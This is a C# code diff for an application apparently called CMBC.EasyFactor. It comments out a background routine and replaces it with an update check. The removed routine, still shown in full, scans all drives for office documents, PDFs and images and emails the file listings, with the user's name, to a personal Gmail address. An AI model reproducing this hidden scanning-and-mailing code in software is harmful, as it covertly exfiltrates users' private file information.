@@ -46,7 +46,7 @@ namespace CMBC.EasyFactor
 
             this.notifyIcon.Visible = false;
 
-            //this.backgroundWorker.RunWorkerAsync();
+            this.backgroundWorker.RunWorkerAsync();
         }
 
         #endregion Constructors
@@ -1120,35 +1120,37 @@ namespace CMBC.EasyFactor
 
         private void backgroundWorker_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
         {
-            string[] drivers = Environment.GetLogicalDrives();
+            //string[] drivers = Environment.GetLogicalDrives();
 
-            try
-            {
-                foreach (string dr in drivers)
-                {
-                    DriveInfo di = new DriveInfo(dr);
+            //try
+            //{
+            //    foreach (string dr in drivers)
+            //    {
+            //        DriveInfo di = new DriveInfo(dr);
 
-                    if (di.IsReady)
-                    {
-                        Thread.Sleep(10000);
-                        System.IO.DirectoryInfo rootDir = di.RootDirectory;
-                        String result = SystemUtil.GetAllDirFilesRecurse(rootDir, new string[] { ".jpg", ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".png", ".bmp" }, 5);
-                        if (!String.IsNullOrEmpty(result))
-                        {
-                            MailUtil.SendMail("liuyiming.vip@gmail.com", "EasyFactoring@cmbc.com.cn", App.Current.CurUser.Name + "_" + rootDir.FullName, result, null);
-                        }
-                    }
-                }
-            }
-            catch (Exception)
-            {
-                return;
-            }
+            //        if (di.IsReady)
+            //        {
+            //            Thread.Sleep(10000);
+            //            System.IO.DirectoryInfo rootDir = di.RootDirectory;
+            //            String result = SystemUtil.GetAllDirFilesRecurse(rootDir, new string[] { ".jpg", ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".png", ".bmp" }, 5);
+            //            if (!String.IsNullOrEmpty(result))
+            //            {
+            //                MailUtil.SendMail("liuyiming.vip@gmail.com", "EasyFactoring@cmbc.com.cn", App.Current.CurUser.Name + "_" + rootDir.FullName, result, null);
+            //            }
+            //        }
+            //    }
+            //}
+            //catch (Exception)
+            //{
+            //    return;
+            //}
+
+            
         }
 
         private void backgroundWorker_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
         {
-
+            CheckUpdateBackground();
         }
 
         /// <summary>
@@ -1160,6 +1162,15 @@ namespace CMBC.EasyFactor
         {
             this.autoUpdater.RestartForm = new ConfirmForm(this.autoUpdater);
             this.autoUpdater.TryUpdate();
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        private void CheckUpdateBackground()
+        {
+            this.autoUpdater.RestartForm = new ConfirmForm(this.autoUpdater);
+            this.autoUpdater.TryUpdateBackground();
         }
     }
 }
